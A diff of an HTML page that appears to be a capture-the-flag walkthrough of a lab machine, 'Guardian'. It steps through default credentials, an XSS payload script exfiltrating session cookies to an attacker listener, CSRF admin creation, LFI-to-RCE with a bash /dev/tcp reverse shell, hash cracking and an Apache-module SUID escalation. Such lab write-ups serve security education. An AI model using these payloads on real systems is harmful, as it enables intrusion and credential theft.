@@ -46,22 +46,45 @@
             <div id="content-en" class="lang-content">
                 <div class="machine-summary">
                     <h2 data-i18n="summary-title">Exploitation Summary</h2>
-                    <p><strong>Exploitation process:</strong> The target machine hosted a university student portal at <code>portal.guardian.htb</code> vulnerable to multiple web exploitation techniques. Initial access was achieved by discovering default credentials for a student account, which led to the discovery of a Gitea instance at <code>gitea.guardian.htb</code> containing the portal's source code and sensitive configuration files. Using an XSS vulnerability in PHPSpreadsheet (CVE-2025-22131), I exfiltrated a lecturer's session token by submitting a malicious XLSX file. With lecturer privileges, I created a malicious notice containing a CSRF payload that forced the admin to create a new admin account under my control. As admin, I exploited a Local File Inclusion vulnerability using PHP filter wrappers to achieve Remote Code Execution and gain a shell as <code>www-data</code>. After cracking MySQL password hashes, I pivoted to user <code>jamil</code>, then escalated to <code>mark</code> by modifying a Python utility script. Finally, I achieved root by exploiting <code>sudo</code> permissions on <code>safeapache2ctl</code>, creating and loading a malicious Apache module that set the SUID bit on <code>/bin/bash</code>.</p>
-                    <p><strong>Technologies/Exploits:</strong> PHPSpreadsheet XSS (CVE-2025-22131), CSRF exploitation, PHP filter wrapper LFI-to-RCE, MySQL password hash cracking with hashcat, Python script hijacking, Apache module loading privilege escalation via custom malicious module.</p>
+                    <p><strong>Exploitation process:</strong> The target machine hosted a university student portal at
+                        <code>portal.guardian.htb</code> vulnerable to multiple web exploitation techniques. Initial
+                        access was achieved by discovering default credentials for a student account, which led to the
+                        discovery of a Gitea instance at <code>gitea.guardian.htb</code> containing the portal's source
+                        code and sensitive configuration files.</p>
+                    <p>Using an XSS vulnerability in PHPSpreadsheet (CVE-2025-22131), I exfiltrated a lecturer's session
+                        token by submitting a malicious XLSX file. With lecturer privileges, I created a malicious
+                        notice containing a CSRF payload that forced the admin to create a new admin account under my
+                        control. As admin, I exploited a Local File Inclusion vulnerability using PHP filter wrappers to
+                        achieve Remote Code Execution and gain a shell as <code>www-data</code>.</p>
+                    <p>After cracking MySQL password hashes, I pivoted to user <code>jamil</code>, then escalated to
+                        <code>mark</code> by modifying a Python utility script. Finally, I achieved root by exploiting
+                        <code>sudo</code> permissions on <code>safeapache2ctl</code>, creating and loading a malicious
+                        Apache module that set the SUID bit on <code>/bin/bash</code>.</p>
+                    <p><strong>Technologies/Exploits:</strong> PHPSpreadsheet XSS (CVE-2025-22131), CSRF exploitation,
+                        PHP filter wrapper LFI-to-RCE, MySQL password hash cracking with hashcat, Python script
+                        hijacking, Apache module loading privilege escalation via custom malicious module.</p>
                 </div>
                 <hr class="summary-divider">
-                
+
                 <h2>Initial Reconnaissance</h2>
                 <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
-                <p><img src="./media/image12.png" alt="Nmap scan results showing open SSH on port 22 and HTTP on port 80" /></p>
-                
-                <p>The scan reveals SSH on port 22 and HTTP on port 80. When visiting port 80, I notice that virtual hosting (vhost) is being used for <code>guardian.htb</code>, and there's a student portal section using the vhost <code>portal.guardian.htb</code>. I add both domains to my <code>/etc/hosts</code> file.</p>
-                
+                <p><img src="./media/image12.png"
+                        alt="Nmap scan results showing open SSH on port 22 and HTTP on port 80" /></p>
+
+                <p>The scan reveals SSH on port 22 and HTTP on port 80. When visiting port 80, I notice that virtual
+                    hosting (vhost) is being used for <code>guardian.htb</code>, and there's a student portal section
+                    using the vhost <code>portal.guardian.htb</code>. I add both domains to my <code>/etc/hosts</code>
+                    file.</p>
+
                 <h2>Web Enumeration - Guardian Portal</h2>
-                <p>At <code>guardian.htb</code>, there's a university website. At <code>portal.guardian.htb</code>, there's a login portal. The main university site at <code>guardian.htb</code> doesn't contain anything particularly interesting, but <code>portal.guardian.htb</code> has significantly more attack surface. Running gobuster reveals numerous interesting routes:</p>
-                
-                <p><img src="./media/image9.png" alt="Gobuster directory enumeration results showing various PHP files and directories" /></p>
-                
+                <p>At <code>guardian.htb</code>, there's a university website. At <code>portal.guardian.htb</code>,
+                    there's a login portal. The main university site at <code>guardian.htb</code> doesn't contain
+                    anything particularly interesting, but <code>portal.guardian.htb</code> has significantly more
+                    attack surface. Running gobuster reveals numerous interesting routes:</p>
+
+                <p><img src="./media/image9.png"
+                        alt="Gobuster directory enumeration results showing various PHP files and directories" /></p>
+
                 <h3>Directory Structure</h3>
                 <p>In <code>/models</code>:</p>
                 <ul>
@@ -69,7 +92,7 @@
                     <li><code>/Program.php</code> (Status: 200) [Size: 0]</li>
                     <li><code>/Message.php</code> (Status: 200) [Size: 0]</li>
                 </ul>
-                
+
                 <p>In <code>/admin</code>:</p>
                 <ul>
                     <li><code>/index.php</code> (Status: 200) [Size: 2900]</li>
@@ -84,9 +107,10 @@
                     <li><code>/chats.php</code> (Status: 200) [Size: 2900]</li>
                     <li><code>/createuser.php</code> (Status: 200) [Size: 2900]</li>
                 </ul>
-                
-                <p>Most of these routes with size 2900 are redirects to <code>/login</code>, indicating authentication is required.</p>
-                
+
+                <p>Most of these routes with size 2900 are redirects to <code>/login</code>, indicating authentication
+                    is required.</p>
+
                 <p>In <code>/admin/reports</code>, there are more interesting files:</p>
                 <ul>
                     <li><code>/system.php</code> (Status: 200) [Size: 763]</li>
@@ -94,56 +118,71 @@
                     <li><code>/academic.php</code> (Status: 200) [Size: 1198]</li>
                     <li><code>/enrollment.php</code> (Status: 200) [Size: 1628]</li>
                 </ul>
-                
+
                 <p><img src="./media/image5.png" alt="Report pages showing various academic and financial data" /></p>
-                
+
                 <p>Although these contain data, nothing immediately useful stands out.</p>
-                
+
                 <h2>Initial Access - Default Credentials</h2>
-                <p>During the first few seconds on the portal, a PDF with login instructions appears, stating that the default password is <code>GU1234</code> until users change it. Since <code>guardian.htb</code> has testimonials from three users, I try their usernames with the default password. As expected, there's always someone who doesn't change their default credentials:</p>
-                
+                <p>During the first few seconds on the portal, a PDF with login instructions appears, stating that the
+                    default password is <code>GU1234</code> until users change it. Since <code>guardian.htb</code> has
+                    testimonials from three users, I try their usernames with the default password. As expected, there's
+                    always someone who doesn't change their default credentials:</p>
+
                 <pre><code class="language-plaintext">GU0142023:GU1234</code></pre>
-                
-                <p>This grants me access to the student portal. The portal has many features, but what immediately catches my attention is a pending assignment section where files can be uploaded - a potential attack vector. There's also a chat feature where XSS might be possible if an admin or another student interacts with it, potentially allowing session cookie theft.</p>
-                
+
+                <p>This grants me access to the student portal. The portal has many features, but what immediately
+                    catches my attention is a pending assignment section where files can be uploaded - a potential
+                    attack vector. There's also a chat feature where XSS might be possible if an admin or another
+                    student interacts with it, potentially allowing session cookie theft.</p>
+
                 <h2>Chat Enumeration - Information Disclosure</h2>
-                <p>In the chat section, there's a selector showing all users, including one named "admin". When initiating a chat, I notice the request goes to this URL:</p>
-                
+                <p>In the chat section, there's a selector showing all users, including one named "admin". When
+                    initiating a chat, I notice the request goes to this URL:</p>
+
                 <pre><code class="language-plaintext">http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=1</code></pre>
-                
-                <p>This reveals that my <code>user_id</code> is 13 and admin's <code>user_id</code> is 1. Testing by changing an ID to a non-existent value like 0 returns a 500 error from the server. More importantly, I can modify these IDs to enumerate chat conversations between admin and other users by iterating through different ID combinations.</p>
-                
+
+                <p>This reveals that my <code>user_id</code> is 13 and admin's <code>user_id</code> is 1. Testing by
+                    changing an ID to a non-existent value like 0 returns a 500 error from the server. More importantly,
+                    I can modify these IDs to enumerate chat conversations between admin and other users by iterating
+                    through different ID combinations.</p>
+
                 <p>I discover this conversation between admin and another user:</p>
-                
+
                 <blockquote>
                     <p><strong>jamil.enockson</strong> Sep 29, 2025 21:00<br>
-                    I am doing great, thanks.</p>
+                        I am doing great, thanks.</p>
                     <p><strong>admin</strong> Sep 29, 2025 21:00<br>
-                    Hello! How are you doing today?</p>
+                        Hello! How are you doing today?</p>
                     <p><strong>admin</strong> Sep 29, 2025 21:00<br>
-                    Here is your password for gitea: DHsNnk3V503</p>
+                        Here is your password for gitea: DHsNnk3V503</p>
                 </blockquote>
-                
+
                 <p>This gives me credentials:</p>
                 <pre><code class="language-plaintext">jamil.enockson@guardian.htb:DHsNnk3V503</code></pre>
-                
+
                 <h2>Gitea Discovery - Source Code Access</h2>
-                <p>The chat message mentions Gitea, suggesting it's hosted somewhere, likely as a vhost under <code>guardian.htb</code>. I add <code>gitea.guardian.htb</code> to my <code>/etc/hosts</code> file and successfully access a Gitea instance at this address. The Gitea installation is running version 1.23.7 and contains the source code for both <code>portal.guardian.htb</code> and <code>guardian.htb</code>.</p>
-                
-                <p>The <code>guardian.htb</code> repository is basic with nothing interesting. However, <code>portal.guardian.htb</code> reveals valuable information.</p>
-                
+                <p>The chat message mentions Gitea, suggesting it's hosted somewhere, likely as a vhost under
+                    <code>guardian.htb</code>. I add <code>gitea.guardian.htb</code> to my <code>/etc/hosts</code> file
+                    and successfully access a Gitea instance at this address. The Gitea installation is running version
+                    1.23.7 and contains the source code for both <code>portal.guardian.htb</code> and
+                    <code>guardian.htb</code>.</p>
+
+                <p>The <code>guardian.htb</code> repository is basic with nothing interesting. However,
+                    <code>portal.guardian.htb</code> reveals valuable information.</p>
+
                 <h3>Source Code Analysis</h3>
                 <p>In <code>composer.json</code>:</p>
-                
+
                 <pre><code class="language-json">{
     "require": {
         "phpoffice/phpspreadsheet": "3.7.0",
         "phpoffice/phpword": "^1.3"
     }
 }</code></pre>
-                
+
                 <p>In <code>config.php</code>:</p>
-                
+
                 <pre><code class="language-php">&lt;?php
 return [
     'db' => [
@@ -154,14 +193,18 @@ return [
     ],
     'salt' => '8Sb)tM1vs1SS'
 ];</code></pre>
-                
-                <p>I try the MySQL root password for the admin account in both Gitea and the portal, but there's no credential reuse in this case. However, I note the salt value for later - it's used universally for all users' password hashes, which will be useful if I need to crack passwords from the database.</p>
-                
-                <p>Reviewing the model files, I don't find any obvious SQL injection vulnerabilities or other exploitable code.</p>
-                
+
+                <p>I try the MySQL root password for the admin account in both Gitea and the portal, but there's no
+                    credential reuse in this case. However, I note the salt value for later - it's used universally for
+                    all users' password hashes, which will be useful if I need to crack passwords from the database.</p>
+
+                <p>Reviewing the model files, I don't find any obvious SQL injection vulnerabilities or other
+                    exploitable code.</p>
+
                 <h2>Further User Enumeration</h2>
-                <p>Returning to the chat feature, I enumerate all possible conversations between users and find a list of lecturers:</p>
-                
+                <p>Returning to the chat feature, I enumerate all possible conversations between users and find a list
+                    of lecturers:</p>
+
                 <ul>
                     <li>Myra.galsworthy</li>
                     <li>GU9612024</li>
@@ -174,31 +217,43 @@ return [
                     <li>GU9492024</li>
                     <li>Crin.hambidge</li>
                 </ul>
-                
-                <p>I attempt to login with various combinations using the passwords I've discovered, but none succeed.</p>
-                
+
+                <p>I attempt to login with various combinations using the passwords I've discovered, but none succeed.
+                </p>
+
                 <h2>XSS Exploitation - PHPSpreadsheet CVE-2025-22131</h2>
-                <p>After thoroughly reviewing the application and finding no apparent vulnerabilities, I investigate the libraries more deeply. I realize I had overlooked a critical vulnerability in PHPSpreadsheet that isn't patched in version 3.7.0:</p>
-                
+                <p>After thoroughly reviewing the application and finding no apparent vulnerabilities, I investigate the
+                    libraries more deeply. I realize I had overlooked a critical vulnerability in PHPSpreadsheet that
+                    isn't patched in version 3.7.0:</p>
+
                 <ul>
-                    <li><a href="https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746">https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746</a></li>
-                    <li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx</a> (includes PoC)</li>
+                    <li><a
+                            href="https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746">https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746</a>
+                    </li>
+                    <li><a
+                            href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx</a>
+                        (includes PoC)</li>
                 </ul>
-                
+
                 <h3>Understanding the Vulnerability</h3>
-                <p>The exploit works by abusing how PHPSpreadsheet handles XLSX files with multiple sheets. When displaying the list of sheet names, the application doesn't sanitize them, making it vulnerable to XSS attacks. Since the portal allows submitting assignments in DOCX and XLSX formats, this is a viable attack vector.</p>
-                
-                <p>I find a proof-of-concept that demonstrates the exploitation technique: <a href="https://github.com/ZzN1NJ4/CVE-2025-22131-PoC/blob/main/gen.sh">https://github.com/ZzN1NJ4/CVE-2025-22131-PoC/blob/main/gen.sh</a></p>
-                
+                <p>The exploit works by abusing how PHPSpreadsheet handles XLSX files with multiple sheets. When
+                    displaying the list of sheet names, the application doesn't sanitize them, making it vulnerable to
+                    XSS attacks. Since the portal allows submitting assignments in DOCX and XLSX formats, this is a
+                    viable attack vector.</p>
+
+                <p>I find a proof-of-concept that demonstrates the exploitation technique: <a
+                        href="https://github.com/ZzN1NJ4/CVE-2025-22131-PoC/blob/main/gen.sh">https://github.com/ZzN1NJ4/CVE-2025-22131-PoC/blob/main/gen.sh</a>
+                </p>
+
                 <p>The exploit works by:</p>
                 <ol>
                     <li>Unzipping an XLSX file (which uses XML internally)</li>
                     <li>Modifying the XML to inject malicious JavaScript</li>
                     <li>Re-compressing the file</li>
                 </ol>
-                
+
                 <p>Here's the exploit script:</p>
-                
+
                 <pre><code class="language-bash">url=$1
 file="poc.xlsx"
 bad="bad.xlsx"
@@ -212,112 +267,152 @@ sed -i "s|img src=x|img src=x onerror=fetch('${safe_url}?'+document.cookie)|" xl
 
 cp $file $bad
 zip -r $bad xl/workbook.xml</code></pre>
-                
-                <p>I use this script to create a malicious XLSX file and submit it as an assignment. Shortly after, I exfiltrate a session token:</p>
-                
+
+                <p>I use this script to create a malicious XLSX file and submit it as an assignment. Shortly after, I
+                    exfiltrate a session token:</p>
+
                 <pre><code class="language-bash">python -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.84 - - "GET /?PHPSESSID=65eslguj8i1u3ojoj6mklkjleh HTTP/1.1" 200 -</code></pre>
-                
-                <p>I replace my session token with the captured one and gain access as the lecturer <code>sammy.treat</code>, who is the professor for the course that received the XLSX file.</p>
-                
+
+                <p>I replace my session token with the captured one and gain access as the lecturer
+                    <code>sammy.treat</code>, who is the professor for the course that received the XLSX file.</p>
+
                 <h2>CSRF Exploitation - Admin Account Creation</h2>
-                <p>As a lecturer, I have additional privileges that students don't have, most notably the ability to create announcements on a notice board. When an announcement is created, it contains a link that the admin reviews.</p>
-                
-                <p>After trying various approaches, I realize this is a perfect scenario for a CSRF attack. The most valuable action to perform via CSRF is creating a new user, as the user creation form allows specifying the user's role:</p>
-                
-                <p><img src="./media/image8.png" alt="User creation form showing role selection dropdown including admin role" /></p>
-                
-                <p>Reviewing the CSRF token logic in the source code, I notice that tokens aren't deleted after use, meaning any CSRF token I find should work for the request I want the admin to make.</p>
-                
+                <p>As a lecturer, I have additional privileges that students don't have, most notably the ability to
+                    create announcements on a notice board. When an announcement is created, it contains a link that the
+                    admin reviews.</p>
+
+                <p>After trying various approaches, I realize this is a perfect scenario for a CSRF attack. The most
+                    valuable action to perform via CSRF is creating a new user, as the user creation form allows
+                    specifying the user's role:</p>
+
+                <p><img src="./media/image8.png"
+                        alt="User creation form showing role selection dropdown including admin role" /></p>
+
+                <p>Reviewing the CSRF token logic in the source code, I notice that tokens aren't deleted after use,
+                    meaning any CSRF token I find should work for the request I want the admin to make.</p>
+
                 <h3>Crafting the CSRF Payload</h3>
-                <p>I extract the CSRF token from the announcement submission form and create an HTML page with an auto-submitting form:</p>
-                
-                <p><img src="./media/image2.png" alt="HTML file containing CSRF payload that automatically submits a form to create an admin user" /></p>
-                
-                <p>I host this HTML file on my machine and send the URL to the admin through a notice. The request succeeds:</p>
-                
+                <p>I extract the CSRF token from the announcement submission form and create an HTML page with an
+                    auto-submitting form:</p>
+
+                <p><img src="./media/image2.png"
+                        alt="HTML file containing CSRF payload that automatically submits a form to create an admin user" />
+                </p>
+
+                <p>I host this HTML file on my machine and send the URL to the admin through a notice. The request
+                    succeeds:</p>
+
                 <pre><code class="language-bash">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.84 - - "GET / HTTP/1.1" 200 -</code></pre>
-                
+
                 <p>I now have my own admin account with full privileges.</p>
-                
+
                 <h2>LFI to RCE - PHP Filter Wrappers</h2>
-                <p>With admin access, I explore the admin panel but don't immediately find any obvious RCE capabilities. However, reviewing the source code in Gitea, I notice something interesting in <code>admin/reports</code> - an <code>include</code> statement with attempted sanitization:</p>
-                
-                <p><img src="./media/image3.png" alt="PHP code showing include statement with sanitization attempts using preg_match" /></p>
-                
-                <p>The code attempts to prevent directory traversal by filtering <code>..</code> and using a regex pattern with <code>preg_match</code>. I try various bypass techniques for the <code>..</code> filter and the regex, but none work directly.</p>
-                
+                <p>With admin access, I explore the admin panel but don't immediately find any obvious RCE capabilities.
+                    However, reviewing the source code in Gitea, I notice something interesting in
+                    <code>admin/reports</code> - an <code>include</code> statement with attempted sanitization:</p>
+
+                <p><img src="./media/image3.png"
+                        alt="PHP code showing include statement with sanitization attempts using preg_match" /></p>
+
+                <p>The code attempts to prevent directory traversal by filtering <code>..</code> and using a regex
+                    pattern with <code>preg_match</code>. I try various bypass techniques for the <code>..</code> filter
+                    and the regex, but none work directly.</p>
+
                 <h3>PHP Wrappers Bypass</h3>
-                <p>Then I realize I can use PHP wrappers (<a href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams">https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams</a>) which don't rely on <code>..</code> for traversal. I achieve RCE using the <code>php://filter</code> wrapper with this URL:</p>
-                
+                <p>Then I realize I can use PHP wrappers (<a
+                        href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams">https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams</a>)
+                    which don't rely on <code>..</code> for traversal. I achieve RCE using the <code>php://filter</code>
+                    wrapper with this URL:</p>
+
                 <pre><code class="language-plaintext">http://portal.guardian.htb/admin/reports.php?report=php://filter/{filters}/resource=reports/enrollment.php&cmd=whoami</code></pre>
-                
-                <p><img src="./media/image7.png" alt="Browser showing successful command execution via PHP filter wrapper returning 'www-data'" /></p>
-                
+
+                <p><img src="./media/image7.png"
+                        alt="Browser showing successful command execution via PHP filter wrapper returning 'www-data'" />
+                </p>
+
                 <p>I now have command execution. I use this to send myself a reverse shell:</p>
-                
+
                 <pre><code class="language-plaintext">http://portal.guardian.htb/admin/reports.php?report=php://filter/{filters}/resource=reports/enrollment.php&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.239/443+0>%261"</code></pre>
-                
+
                 <p>And successfully receive a shell as <code>www-data</code>.</p>
-                
+
                 <h2>Lateral Movement - MySQL Password Cracking</h2>
                 <p>Looking at the system users:</p>
-                
-                <p><img src="./media/image4.png" alt="Output showing users on the system including jamil, mark, sammy, and myra" /></p>
-                
-                <p>My target is the MySQL database, for which I have the root credentials and the salt value from the configuration file. I connect to the database and extract the admin password hash:</p>
-                
+
+                <p><img src="./media/image4.png"
+                        alt="Output showing users on the system including jamil, mark, sammy, and myra" /></p>
+
+                <p>My target is the MySQL database, for which I have the root credentials and the salt value from the
+                    configuration file. I connect to the database and extract the admin password hash:</p>
+
                 <pre><code class="language-plaintext">694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6</code></pre>
-                
+
                 <p>With the salt:</p>
                 <pre><code class="language-plaintext">8Sb)tM1vs1SS</code></pre>
-                
+
                 <p>I create a file in the format <code>hash:salt</code> and use hashcat to crack it:</p>
-                
+
                 <pre><code class="language-bash">hashcat -m 1410 -a 0 -o found.txt hashplussalt.txt /usr/share/wordlists/rockyou.txt</code></pre>
-                
+
                 <p>Hashcat quickly cracks the hash, revealing the password:</p>
                 <pre><code class="language-plaintext">fakebake000</code></pre>
-                
-                <p>I try SSH and <code>su</code> with this password for all four users on the machine, but it doesn't work. I return to MySQL and extract the password hashes for the other users. I successfully crack jamil's password:</p>
-                
+
+                <p>I try SSH and <code>su</code> with this password for all four users on the machine, but it doesn't
+                    work. I return to MySQL and extract the password hashes for the other users. I successfully crack
+                    jamil's password:</p>
+
                 <pre><code class="language-plaintext">jamil:copperhouse56</code></pre>
-                
-                <p>I'm unable to crack mark's and sammy's passwords, but jamil's credentials allow me to switch to that user and retrieve the user flag:</p>
-                
+
+                <p>I'm unable to crack mark's and sammy's passwords, but jamil's credentials allow me to switch to that
+                    user and retrieve the user flag:</p>
+
                 <p><img src="./media/image10.png" alt="Terminal showing successful capture of user.txt flag" /></p>
-                
+
                 <h2>Privilege Escalation - Python Script Hijacking</h2>
                 <p>Checking sudo privileges as jamil:</p>
-                
-                <p><img src="./media/image6.png" alt="Output of sudo -l showing jamil can run a Python utilities script as mark" /></p>
-                
-                <p>I can execute a Python script located at <code>/opt/scripts/utilities.py</code> as the user <code>mark</code>. Both jamil and mark are members of the <code>admins</code> group.</p>
-                
-                <p>The script in <code>/opt/scripts/utilities</code> includes <code>utilities.py</code> and two files: <code>output</code> and <code>utils</code>. The script allows executing four different Python functions from the <code>utils</code> file. Since one of these files is writable by the <code>admins</code> group, I simply add:</p>
-                
+
+                <p><img src="./media/image6.png"
+                        alt="Output of sudo -l showing jamil can run a Python utilities script as mark" /></p>
+
+                <p>I can execute a Python script located at <code>/opt/scripts/utilities.py</code> as the user
+                    <code>mark</code>. Both jamil and mark are members of the <code>admins</code> group.</p>
+
+                <p>The script in <code>/opt/scripts/utilities</code> includes <code>utilities.py</code> and two files:
+                    <code>output</code> and <code>utils</code>. The script allows executing four different Python
+                    functions from the <code>utils</code> file. Since one of these files is writable by the
+                    <code>admins</code> group, I simply add:</p>
+
                 <pre><code class="language-python">os.system("/bin/bash")</code></pre>
-                
+
                 <p>When I execute the utility script with sudo, it spawns a bash shell as <code>mark</code>.</p>
-                
+
                 <h2>Root Privilege Escalation - Apache Module Loading</h2>
                 <p>As mark, checking sudo permissions:</p>
-                
+
                 <pre><code class="language-plaintext">User mark may run the following commands on guardian:
     (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl</code></pre>
-                
-                <p>The <code>apache2ctl</code> binary has a GTFOBins entry for sudo that typically allows reading files as root, but this "safe" version appears to have some custom patches. Testing the command, I find I'm limited to the <code>-f</code> flag of apache2ctl, whereas GTFOBins typically uses the <code>-c</code> flag.</p>
-                
+
+                <p>The <code>apache2ctl</code> binary has a GTFOBins entry for sudo that typically allows reading files
+                    as root, but this "safe" version appears to have some custom patches. Testing the command, I find
+                    I'm limited to the <code>-f</code> flag of apache2ctl, whereas GTFOBins typically uses the
+                    <code>-c</code> flag.</p>
+
                 <h3>Understanding Apache2ctl</h3>
-                <p>The <code>apache2ctl</code> command is used to control Apache configuration, status, and to start, restart, or terminate the httpd process. This allows you to launch custom httpd servers with your own configuration. However, being limited to <code>apache2ctl -f</code> only allows checking the configuration file - it doesn't actually start the server.</p>
-                
-                <p>After extensive research and testing various approaches, the only viable option appears to be creating and loading a malicious Apache module that, for example, sets the SUID bit on <code>/bin/bash</code>.</p>
-                
+                <p>The <code>apache2ctl</code> command is used to control Apache configuration, status, and to start,
+                    restart, or terminate the httpd process. This allows you to launch custom httpd servers with your
+                    own configuration. However, being limited to <code>apache2ctl -f</code> only allows checking the
+                    configuration file - it doesn't actually start the server.</p>
+
+                <p>After extensive research and testing various approaches, the only viable option appears to be
+                    creating and loading a malicious Apache module that, for example, sets the SUID bit on
+                    <code>/bin/bash</code>.</p>
+
                 <h3>Malicious Apache Module</h3>
                 <p>I create an Apache configuration file that loads correctly:</p>
-                
+
                 <pre><code class="language-apache">ServerRoot "/etc/apache2"
 
 # Use port 4000 instead of the default 80
@@ -354,40 +449,73 @@ TypesConfig /etc/mime.types
         Require all granted
     &lt;/Directory&gt;
 &lt;/VirtualHost&gt;</code></pre>
-                
-                <p>And this C code for the malicious module, which declares an Apache-compliant module and uses a command table to specify a handler that sets the SUID bit on bash:</p>
-                
-                <p><img src="./media/image1.png" alt="C code for malicious Apache module that sets SUID bit on /bin/bash" /></p>
-                
+
+                <p>And this C code for the malicious module, which declares an Apache-compliant module and uses a
+                    command table to specify a handler that sets the SUID bit on bash:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="C code for malicious Apache module that sets SUID bit on /bin/bash" /></p>
+
                 <p>I compile the module and execute the command:</p>
-                
+
                 <pre><code class="language-bash">mark@guardian:~/confs$ sudo safeapache2ctl -f xd.conf
 [Tue Sep 30 17:10:20.869458 2025] [:notice] [pid 6231] Successfully set SUID bit on /bin/bash</code></pre>
-                
-                <p>The module successfully sets the SUID bit on bash. I can now obtain the root flag using the privileged bash:</p>
-                
-                <p><img src="./media/image11.png" alt="Terminal showing successful capture of root.txt flag using bash -p" /></p>
+
+                <p>The module successfully sets the SUID bit on bash. I can now obtain the root flag using the
+                    privileged bash:</p>
+
+                <p><img src="./media/image11.png"
+                        alt="Terminal showing successful capture of root.txt flag using bash -p" /></p>
             </div>
 
             <div id="content-es" class="lang-content" style="display:none;">
                 <div class="machine-summary">
                     <h2 data-i18n="summary-title">Resumen de Explotación</h2>
-                    <p><strong>Resumen del proceso:</strong> La máquina objetivo alojaba un portal de estudiantes universitarios en <code>portal.guardian.htb</code> vulnerable a múltiples técnicas de explotación web. El acceso inicial se consiguió descubriendo credenciales por defecto para una cuenta de estudiante, lo que llevó al descubrimiento de una instancia de Gitea en <code>gitea.guardian.htb</code> que contenía el código fuente del portal y archivos de configuración sensibles. Utilizando una vulnerabilidad XSS en PHPSpreadsheet (CVE-2025-22131), exfiltré el token de sesión de un profesor mediante el envío de un archivo XLSX malicioso. Con privilegios de profesor, creé un anuncio malicioso conteniendo un payload CSRF que forzó al admin a crear una nueva cuenta de admin bajo mi control. Como admin, exploté una vulnerabilidad de Local File Inclusion usando wrappers de filtro de PHP para conseguir Ejecución Remota de Código y obtener una shell como <code>www-data</code>. Tras crackear hashes de contraseñas de MySQL, pivoté al usuario <code>jamil</code>, luego escalé a <code>mark</code> modificando un script de utilidad Python. Finalmente, conseguí root explotando permisos <code>sudo</code> sobre <code>safeapache2ctl</code>, creando y cargando un módulo malicioso de Apache que estableció el bit SUID en <code>/bin/bash</code>.</p>
-                    <p><strong>Tecnologías/Exploits:</strong> XSS en PHPSpreadsheet (CVE-2025-22131), explotación CSRF, LFI-a-RCE mediante wrapper de filtro PHP, cracking de hashes de contraseñas MySQL con hashcat, hijacking de script Python, escalada de privilegios mediante carga de módulo de Apache vía módulo malicioso personalizado.</p>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo alojaba un portal de estudiantes
+                        universitarios en <code>portal.guardian.htb</code> vulnerable a múltiples técnicas de
+                        explotación web. El acceso inicial se consiguió descubriendo credenciales por defecto para una
+                        cuenta de estudiante, lo que llevó al descubrimiento de una instancia de Gitea en
+                        <code>gitea.guardian.htb</code> que contenía el código fuente del portal y archivos de
+                        configuración sensibles.</p>
+                    <p>Utilizando una vulnerabilidad XSS en PHPSpreadsheet (CVE-2025-22131), exfiltré el token de sesión
+                        de un profesor mediante el envío de un archivo XLSX malicioso. Con privilegios de profesor, creé
+                        un anuncio malicioso conteniendo un payload CSRF que forzó al admin a crear una nueva cuenta de
+                        admin bajo mi control. Como admin, exploté una vulnerabilidad de Local File Inclusion usando
+                        wrappers de filtro de PHP para conseguir Ejecución Remota de Código y obtener una shell como
+                        <code>www-data</code>.</p>
+                    <p>Tras crackear hashes de contraseñas de MySQL, pivoté al usuario <code>jamil</code>, luego escalé
+                        a <code>mark</code> modificando un script de utilidad Python. Finalmente, conseguí root
+                        explotando permisos <code>sudo</code> sobre <code>safeapache2ctl</code>, creando y cargando un
+                        módulo malicioso de Apache que estableció el bit SUID en <code>/bin/bash</code>.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> XSS en PHPSpreadsheet (CVE-2025-22131), explotación CSRF,
+                        LFI-a-RCE mediante wrapper de filtro PHP, cracking de hashes de contraseñas MySQL con hashcat,
+                        hijacking de script Python, escalada de privilegios mediante carga de módulo de Apache vía
+                        módulo malicioso personalizado.</p>
                 </div>
                 <hr class="summary-divider">
-                
+
                 <h2>Reconocimiento Inicial</h2>
-                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
-                <p><img src="./media/image12.png" alt="Resultados del escaneo de nmap mostrando SSH abierto en el puerto 22 y HTTP en el puerto 80" /></p>
-                
-                <p>El escaneo revela SSH en el puerto 22 y HTTP en el puerto 80. Al visitar el puerto 80, observo que se aplica virtual hosting (vhost) para <code>guardian.htb</code>, y hay una sección de portal de estudiantes que usa el vhost <code>portal.guardian.htb</code>. Añado ambos dominios a mi archivo <code>/etc/hosts</code>.</p>
-                
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la
+                    máquina objetivo:</p>
+                <p><img src="./media/image12.png"
+                        alt="Resultados del escaneo de nmap mostrando SSH abierto en el puerto 22 y HTTP en el puerto 80" />
+                </p>
+
+                <p>El escaneo revela SSH en el puerto 22 y HTTP en el puerto 80. Al visitar el puerto 80, observo que se
+                    aplica virtual hosting (vhost) para <code>guardian.htb</code>, y hay una sección de portal de
+                    estudiantes que usa el vhost <code>portal.guardian.htb</code>. Añado ambos dominios a mi archivo
+                    <code>/etc/hosts</code>.</p>
+
